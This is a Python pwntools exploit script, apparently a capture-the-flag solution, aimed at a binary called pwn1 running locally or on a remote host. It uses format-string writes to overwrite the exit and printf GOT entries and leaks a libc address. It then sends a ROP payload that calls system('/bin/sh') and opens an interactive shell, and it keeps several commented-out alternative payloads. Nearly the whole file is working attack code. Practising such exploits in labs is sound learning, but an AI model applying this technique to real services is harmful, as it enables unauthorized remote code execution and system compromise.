#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './pwn1'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = './libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget

# elf, libc

# exit -> main & leak libc
payload = ''
payload += p64(elf.got['exit'])+p64(elf.got['read'])
payload = payload.ljust(16,'A')
payload +=  '%%%dc'%(elf.sym['main']&0xffff)
payload += '%8$hn%9$s'
payload = payload.ljust(31,'B')
print payload

debug()
sl(payload)

data = ru('\x0a\x6e\x20\x48\x5a')[-6:]

p.hexdump(data)
read = uu64(data)
libcbase = read-libc.sym['read']
info_addr('read',read)
info_addr('libcbase',libcbase)
printf = libcbase + libc.sym['printf']
info_addr('printf',printf)
fflush = libcbase + libc.sym['fflush']
info_addr('fflush',fflush)
system = libcbase + libc.sym['system']
info_addr('system',system)
puts = libcbase + libc.sym['puts']
info_addr('puts',puts)
free_hook = libcbase + libc.sym['__free_hook']
info_addr('free_hook',free_hook)
# og = libcbase + og_off[0]
# info_addr('og',og)
p4r = libcbase + 0x00054f95
# p4r = libcbase + 0x00064950
info_addr('p4r',p4r)

# print hex(system&0xffffffff)
pause()
# print libs.sym['read']

pl2 = ''
pl2 += p64(elf.got['printf'])
pl2 = pl2.ljust(16,'C')
pl2 += '%%%dc'%(p4r&0xffff)
pl2 += '%8$hn'
pl2 = pl2.ljust(31,'D')
print pl2

sl(pl2)

pause()
pl3 = 'A'*8+p64(system)
pl3+= '/bin/sh\0'
sl(pl3)
# pl3_0 = ''
# pl3_0 += 'EEEEEE' + p64(elf.got['exit'])
# # pl3_0 = pl3_0.rjust(14,'E')
# pl3_0 += '%%%dc'%(system&0xffff)
# pl3_0 += '%9$hn'
# pl3_0 = pl3_0.ljust(29,'F')
# print pl3_0
# sl(pl3_0)

# pl3 = ''
# pl3 += p64(elf.got['exit']+2)
# pl3 = pl3.ljust(16,'E')
# pl3 += '%%%dc'%((system>>16)&0xffff)
# pl3 += '%8$hn'
# pl3 = pl3.ljust(31,'F')
# print pl3
# sl(pl3)

# pl4 = ''
# pl4 += p64(elf.got['exit']+4)
# pl4 = pl4.ljust(16,'G')
# pl4 += '%%%dc'%((system>>32)&0xffff)
# pl4 += '%8$hn'
# pl4 = pl4.ljust(31,'H')
# print pl4
# sl(pl4)

# # trigger free_hook
# pl5 = ''
# pl5 += p64(elf.got['fflush'])
# pl5 = pl5.ljust(16,'K')
# pl5 += '%%%dc'%(0x4011EC&0xffff)
# pl5 += '%8$hn'
# pl5 = pl5.ljust(31,'c')
# print pl5
# # pause()
# sl(pl5)

# log.warning('--------------')

p.interactive()

